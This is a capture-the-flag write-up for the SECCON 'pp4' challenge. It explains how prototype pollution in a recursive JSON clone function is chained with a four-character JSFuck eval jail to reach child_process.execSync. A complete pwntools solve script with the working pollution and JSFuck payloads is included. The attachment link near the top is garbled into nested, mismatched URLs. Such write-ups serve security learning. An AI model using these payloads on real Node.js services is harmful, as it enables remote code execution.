# pp4 - Jail

By: Lyndon

> Let's enjoy the polluted programming💥
>
> `nc pp4.seccon.games 5000`
> 
> [`pp4.tar.gz`](https://storage.googleapis.com/hitcon-ctf-2024-qual-attachment/brokenshare/brokenshare-4af73c97cbac939d9eade6a32503050a7403ba47.tar.gz](https://score.quals.seccon.jp/api/download?key=quals202413%2Fdual_summon.tar.gz](https://score.quals.seccon.jp/api/download?key=quals202413%2Fpp4.tar.gz)))
>
- Author: krk
- Solves: 41

## Challenge

In `index.js`:

```js
#!/usr/local/bin/node
const readline = require("node:readline/promises");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const clone = (target, result = {}) => {
  for (const [key, value] of Object.entries(target)) {
    if (value && typeof value == "object") {
      if (!(key in result)) result[key] = {};
      clone(value, result[key]);
    } else {
      result[key] = value;
    }
  }
  return result;
};

(async () => {
  // Step 1: Prototype Pollution
  const json = (await rl.question("Input JSON: ")).trim();
  console.log(clone(JSON.parse(json)));

  // Step 2: JSF**k with 4 characters
  const code = (await rl.question("Input code: ")).trim();
  if (new Set(code).size > 4) {
    console.log("Too many :(");
    return;
  }
  console.log(eval(code));
})().finally(() => rl.close());
```

## Solution

This was a simple challenge with two components: a prototype pollution gadget and a JSFuck jail with 4 unique characters.

The generic JSFuck exploit payload typically has this form: `[]['constructor']['constructor']('PAYLOAD')()`. However, we are only given 4 unique characters,
which is not enough to generate the necessary strings.

However, we can do some weird things when given the ability to modify JavaScript objects. For example, we can "overload" the logic for indexing an object ike this:

```js
{}.constructor.prototype['a'] = 1;
console.log([]['a'])  // prints 1
```

This turns out to be a very useful primitive. In particular, we can assign `{}[''] = 'PAYLOAD'`, and then use that payload string in JSFuck via `[][[]]`
(note that the `[]` gets coerced to `''` when indexing). The corresponding prototype pollution payload looks like this:
```
{"":{"constructor":{"prototype":{"":"console.log(1)"}}}}
```

This almost solves the challenge, but we also need to somehow store the other `'constructor'` string. I ended up solving it by storing the payload string as the *key*,
and then accessing it in JSFuck becomes `[][[][[]]]`. From there, we can easily obtain a shell by importing `child_process` and calling the `execSync` method:

```js
console.log(process.mainModule.require('child_process').execSync('cat /flag-1863aa693df962ff8433c6b227d63dc0.txt')+'')
```

## Solve

```py
from pwn import *
import json

# io = process(['node', 'index.js'])
io = remote('pp4.seccon.games', 5000)

code = "console.log(process.mainModule.require('child_process').execSync('cat /flag-1863aa693df962ff8433c6b227d63dc0.txt')+'')"
data = {"": {"constructor": {"prototype": {code: "constructor", "": code}}}}
payload = '[][[][[][[]]]][[][[][[]]]]([][[]])()'

io.sendlineafter(b'Input JSON: ', json.dumps(data).encode())
io.sendlineafter(b'Input code: ', payload.encode())
io.interactive()
```
